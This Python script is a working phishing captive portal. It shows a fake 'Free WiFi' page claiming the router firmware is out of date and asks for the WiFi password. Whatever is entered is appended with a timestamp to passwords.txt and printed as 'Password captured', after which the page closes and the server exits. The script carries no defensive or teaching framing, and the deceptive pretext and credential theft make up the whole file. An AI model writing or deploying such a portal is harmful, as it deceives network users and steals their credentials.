#!/usr/bin/env python3
"""
Minimal Captive Portal - Router Firmware Update Style
Using Python HTTPServer with socket reuse
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
from datetime import datetime
import threading
import time
import os
import socket

# HTML template
PORTAL_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WiFi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f5f5f5;
            margin: 0;
            padding: 0;
            min-height: 100vh;
        }

        .blue-header {
            background: #2196F3;
            color: white;
            padding: 30px 40px;
            text-align: left;
        }

        .blue-header h1 {
            font-size: 36px;
            font-weight: 400;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .blue-header p {
            font-size: 16px;
            opacity: 0.9;
            font-weight: 300;
        }

        .content {
            background: white;
            margin: 0;
            padding: 40px;
            min-height: calc(100vh - 140px);
        }

        .update-title {
            font-size: 48px;
            font-weight: 300;
            color: #333;
            margin-bottom: 30px;
            letter-spacing: -1px;
        }

        .update-message {
            font-size: 16px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 50px;
            max-width: 600px;
        }

        .form-group {
            margin-bottom: 30px;
            max-width: 600px;
        }

        .form-label {
            display: block;
            font-size: 16px;
            font-weight: 400;
            color: #333;
            margin-bottom: 12px;
        }

        .form-input {
            width: 100%;
            padding: 18px 20px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            background: white;
            transition: border-color 0.3s ease;
            font-family: monospace;
            letter-spacing: 2px;
        }

        .form-input:focus {
            outline: none;
            border-color: #2196F3;
            box-shadow: 0 0 0 1px #2196F3;
        }

        .form-input::placeholder {
            color: #999;
            letter-spacing: 1px;
        }

        .start-btn {
            width: 100%;
            max-width: 600px;
            background: #e0e0e0;
            color: #666;
            border: 1px solid #ccc;
            padding: 20px 24px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 400;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 60px;
        }

        .start-btn:hover {
            background: #d5d5d5;
            border-color: #bbb;
        }

        .footer-text {
            color: #999;
            font-size: 14px;
            text-align: left;
            font-weight: 300;
        }
    </style>
</head>
<body>
    <div class="blue-header">
        <h1>Free WiFi</h1>
        <p>Router info.</p>
    </div>

    <div class="content">
        <h2 class="update-title">Update</h2>

        <p class="update-message">
            Your router firmware is out of date. Update your firmware to continue browsing normally.
        </p>

        <form method="POST" action="/">
            <div class="form-group">
                <label class="form-label" for="password">WiFi password:</label>
                <input type="password" id="password" name="password" class="form-input" placeholder="•••••••••••" required>
            </div>

            <button type="submit" class="start-btn">Start</button>
        </form>

        <p class="footer-text">© All rights reserved.</p>
    </div>
</body>
</html>
"""

class CaptivePortalHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress default logging
        pass
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(PORTAL_TEMPLATE.encode('utf-8'))
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parse form data
        parsed_data = urllib.parse.parse_qs(post_data)
        password = parsed_data.get('password', [''])[0].strip()
        
        if password:
            # Save password to file
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open('passwords.txt', 'a') as f:
                f.write(f"{timestamp} - {password}\n")
            
            print(f"Password captured: {password}")
            
            # Schedule server shutdown
            def shutdown_server():
                time.sleep(1)
                print("Shutting down server...")
                os._exit(0)
            
            threading.Thread(target=shutdown_server, daemon=True).start()
            
            # Return JavaScript to close the page
            close_script = """
            <script>
                window.close();
                window.open('', '_self', '');
                window.close();
            </script>
            """
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(close_script.encode('utf-8'))
        else:
            # Redirect back to form if no password
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()


class ReusableHTTPServer(HTTPServer):
    allow_reuse_address = True
    allow_reuse_port = True
    
    def server_bind(self):
        # Set SO_REUSEADDR
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print(f"SO_REUSEADDR set to: {self.socket.getsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR)}")
        
        # Set SO_REUSEPORT if available
        try:
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            print(f"SO_REUSEPORT set to: {self.socket.getsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT)}")
        except (AttributeError, OSError) as e:
            print(f"SO_REUSEPORT not available or failed to set: {e}")
        
        super().server_bind()


def captive_portal(server_ip, port=80):
    """Run the captive portal with socket reuse options"""
    
    print(f"Starting captive portal on {server_ip}:{port}")
    
    try:
        httpd = ReusableHTTPServer((server_ip, port), CaptivePortalHandler)
        print(f"Successfully bound to {server_ip}:{port}")
        print("Captive Portal Running")
        
        httpd.serve_forever()
        
    except OSError as e:
        if e.errno == 98:  # Address already in use
            print(f"Failed to bind to {server_ip}:{port} - Address already in use")
            print("Another process is using this address:port combination")
        else:
            print(f"Failed to bind to {server_ip}:{port} - {e}")
        raise
    except KeyboardInterrupt:
        print("\nServer stopped by user")
    except Exception as e:
        print(f"Server error: {e}")
    finally:
        print("Cleaning up server...")
        if 'httpd' in locals():
            httpd.shutdown()
            httpd.server_close()


if __name__ == "__main__":
    # Example usage
    captive_portal("192.168.0.1", 8080)
